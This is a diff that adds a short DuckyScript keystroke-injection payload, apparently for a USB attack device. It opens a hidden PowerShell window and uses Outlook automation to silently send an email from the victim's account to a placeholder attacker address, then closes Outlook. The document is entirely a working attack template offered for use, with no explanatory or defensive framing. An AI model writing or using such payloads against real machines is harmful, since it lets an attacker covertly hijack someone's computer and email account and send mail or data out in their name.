@@ -1,0 +1,29 @@
+GUI r
+DELAY 1000
+STRING powershell.exe -windowstyle hidden
+ENTER
+DELAY 5000
+STRING $Outlook = New-Object -ComObject Outlook.Application
+ENTER
+DELAY 1000
+STRING $MAIL = $Outlook.CreateItem(0)
+ENTER
+DELAY 1000
+STRING $Mail.To = "<yourEmail@here.com"
+ENTER
+DELAY 1000
+STRING $Mail.Subject = "<Your subject>"
+ENTER
+DELAY 1000
+STRING $Mail.Body = "<Your Body>"
+ENTER
+DELAY 1000
+STRING $Mail.Send()
+ENTER
+DELAY 1000
+STRING $Outlook.Quit()
+ENTER
+DELAY 1000
+STRING [System.Runtime.Interopservices.MArshal]::ReleaseComObject($Outlook) | Out-Null
+ENTER
+DELAY 1000
